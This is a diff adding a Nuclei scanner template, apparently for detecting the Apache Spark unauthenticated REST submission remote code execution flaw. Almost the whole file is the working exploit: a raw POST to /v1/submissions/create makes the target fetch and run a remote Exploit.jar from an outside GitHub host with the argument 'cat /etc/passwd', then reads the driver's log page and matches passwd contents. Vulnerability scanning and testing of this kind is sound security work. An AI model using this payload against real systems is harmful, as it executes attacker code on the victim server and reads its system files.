@@ -1,0 +1,63 @@
+id: apache-spark-rce
+
+info:
+  name: Apache Spark RCE
+  author: pikpikcu
+  severity: high
+  reference: https://github.com/vulhub/vulhub/tree/master/spark/unacc
+  tags: rce,apache,spark
+
+requests:
+  - raw:
+      - |
+        POST /v1/submissions/create HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
+        Content-Type: application/json
+        Content-Length: 614
+
+        {
+          "action": "CreateSubmissionRequest",
+          "clientSparkVersion": "2.3.1",
+          "appArgs": [
+            "cat /etc/passwd"
+          ],
+          "appResource": "https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar",
+          "environmentVariables": {
+            "SPARK_ENV_LOADED": "1"
+          },
+          "mainClass": "Exploit",
+          "sparkProperties": {
+            "spark.jars": "https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar",
+            "spark.driver.supervise": "false",
+            "spark.app.name": "Exploit",
+            "spark.eventLog.enabled": "true",
+            "spark.submit.deployMode": "cluster",
+            "spark.master": "spark://{{Hostname}}"
+          }
+        }
+      - |
+        GET /logPage/?driverId={{driver}}&logType=stdout HTTP/1.1
+        Host: {{Hostname}}:8081
+        User-Agent: Nuclei - Open-source project (github.com/projectdiscovery/nuclei)
+        Connection: close
+        Accept: */*
+        Accept-Language: en
+
+    extractors:
+      - type: regex
+        name: driver
+        part: body
+        internal: true
+        regex:
+          - "driver-(.*)-[0-9]+"
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "root:[x*]:0:0"
+        part: body
+      - type: status
+        status:
+          - 200
